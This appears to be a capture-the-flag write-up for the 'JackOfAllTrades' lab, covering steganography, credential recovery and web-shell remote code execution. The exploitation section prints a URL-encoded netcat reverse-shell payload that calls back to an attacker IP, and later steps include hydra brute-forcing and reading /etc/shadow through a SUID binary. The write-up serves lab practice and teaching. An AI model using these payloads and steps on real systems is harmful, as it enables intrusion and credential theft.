JackOfAllTrades

Target IP: 10.10.84.228

Scanning


There are only two TCP ports open on the target machine: SSH and HTTP. Funnily enough, the HTTP application is running on SSH port and vice-versa. I will start enumerating with the HTTP application on port 22.

Enumeration

Port 22: HTTP


After making changes to my web-browser, I can finally access the SSH port as HTTP. The webpage above is displayed for this web application. There is a possible username of jack.


Viewing the source-code of this web-page contains a base64 string.


Decoding this base64 string gives the message above. Maybe Johnny is a possible username? And apparently there is another page called /recovery.php. I obtained the password u?WtKSraq.


The webpage is displayed for the recovery.php.


Before attempting to login, I viewed the source-code and there is an interesting base32 string.


I decoded the base32 string and used caesar cipher to get the plaintext shown above. The bit.ly links to the page https://en.wikipedia.org/wiki/Stegosauria.


I downloaded the picture of the dinosaur from the main page on my machine and ran the command steghide extract -sf stego.jpg with the password u?WtKSraq. This was successful because I was able to extract the file creds.txt.


The only other image left from the homepage is the header.jpg. I was able to obtain the file cms.creds that was hidden inside this image. The credential are shown above.

Exploitation


I gained access to the webpage above after using the credential jackinthebox:TplFxiSHjY against recovery.php. The message above hints there is a parameter called cmd which can be used for RCE.


And bingo. It worked. I can perform RCE using this simple web-shell. Time to upgrade this to a reverse shell connection.


Using the simple web-shell, I gained a reverse shell connection on port 8443. Now I have a foothold on the target machine. I used the payload below.
Payload used: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.14.55.153%208443%20%3E%2Ftmp%2Ff
Full URL with payload: http://10.10.84.228:22/nnxhweOV/index.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.14.55.153%208443%20%3E%2Ftmp%2Ff

Privilege Escalation


There is an interesting password wordlist. The name of the file hints the password of user jack is included in this file. I copied the possible passwords to my machine.


After running hydra with the username jack and the password list, I got a hit on jack:ITMJpGGIqg1jn?>@. Then I connected to the SSH application with this new credential. Now I have control over the user account of jack.


There is an interesting file called user.jpg. Using nc, I transferred this file to my machine. After viewing the file, it turns out this file is the user flag.




Looks like the binary /usr/bin/strings has SUID bit set. Meaning I can use this binary with root privileges. Trying to obtain the SSH key of root did not work. I managed to read the /etc/shadow file, but I was unable to crack the password hash of the root. However, I can still use this binary to read the root.txt.
